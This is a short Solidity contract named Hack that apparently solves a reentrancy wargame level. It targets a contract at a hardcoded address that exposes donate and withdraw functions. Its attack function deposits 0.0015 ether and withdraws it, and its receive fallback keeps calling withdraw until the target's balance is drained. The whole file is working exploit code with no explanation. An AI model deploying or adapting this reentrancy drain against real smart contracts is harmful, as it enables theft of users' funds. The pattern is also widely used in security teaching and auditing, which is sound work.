// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract Hack {
    IReentrance private immutable target =
        IReentrance(0xC50AF8c510a1A1102cfdCA5d100570743E368CDf);

    function _getAmountToWithdraw() private view returns (uint256) {
        if (address(target).balance > 0.0015 ether) {
            return 0.0015 ether;
        } else {
            return address(target).balance;
        }
    }

    function attack() external payable {
        require(msg.value == 0.0015 ether);
        target.donate{value: 0.0015 ether}(address(this));
        target.withdraw(0.0015 ether);
    }

    receive() external payable {
        uint256 amount = _getAmountToWithdraw();
        if (amount > 0) {
            target.withdraw(amount);
        }
    }
}
